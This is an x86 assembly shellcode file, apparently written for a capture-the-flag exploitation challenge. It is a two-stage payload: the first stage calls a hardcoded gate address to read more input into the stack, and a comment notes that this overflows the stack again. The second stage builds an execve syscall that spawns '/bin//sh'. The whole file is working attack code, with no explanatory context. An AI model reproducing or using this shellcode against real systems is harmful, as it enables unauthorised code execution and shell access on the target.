BITS 32
	jmp next_
	add esp, 0x100
	jmp esp
next_:
	push 	esp
	pop 	ebx
	sub		ebx, 0x100
	
	push 	0x1000				; size recv
	push 	ebx					; buffer -> stack -> overflow again!
	push 	0					; stdin
	push 	1					; read number
	mov 	eax, 0x08048110		; enter_gate
	call	eax

	signature times 0x10 db 0x71
	
	sub 	esp, 0x100
	mov     dword [esp+0x80], 0x07000018 	;07000018  int     80h             ; LINUX -		
	mov     dword [esp+0x84], 0x07000018 	;07000018  int     80h             ; LINUX -		
	mov     dword [esp+0x7C], 0x07000018 	;07000018  int     80h             ; LINUX -		
	xor 	edx, edx
	xor 	esi, esi
	xor 	edi, edi
	xor		eax, eax
	xor 	ecx, ecx
	mov 	BYTE al, 11 ; execve syscall #11
	push 	edx ; push some nulls for string termination.
	push 	0x68732f2f ; push "//sh" to the stack.
	push 	0x6e69622f ; push "/bin" to the stack.
	mov 	ebx, esp ; Put the address of "/bin//sh" into ebx via esp.
	push 	ecx ; push 32-bit null terminator to stack.
	mov 	edx, esp ; This is an empty array for envp.
	push 	ebx ; push string addr to stack above null terminator.
	mov 	ecx, esp ; This is the argv array with string ptr.
	call 	dword [esp+0x94]
	
	